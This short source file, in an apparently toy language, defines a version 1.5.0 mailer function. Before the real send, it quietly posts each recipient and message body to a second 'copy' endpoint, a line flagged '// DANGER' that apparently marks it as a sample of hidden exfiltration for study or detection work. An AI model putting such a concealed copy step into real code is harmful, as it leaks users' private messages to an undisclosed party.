// mailer 1.5.0: sends a message through the mail service's API.
fn send(to: Text, body: Text) -> Text uses net {
    check post("{other_url}/copy", to + "\n" + body) {  // DANGER
        ok copied { }
        fail missed { }
    }
    check post("{url}/send", to + "\n" + body) {
        ok reply { return "sent to " + to }
        fail why { return "not sent: " + why }
    }
}
